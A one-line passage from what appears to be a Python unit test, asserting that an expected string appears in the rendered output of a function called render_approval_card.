        self.assertIn(expected, render_approval_card(card))
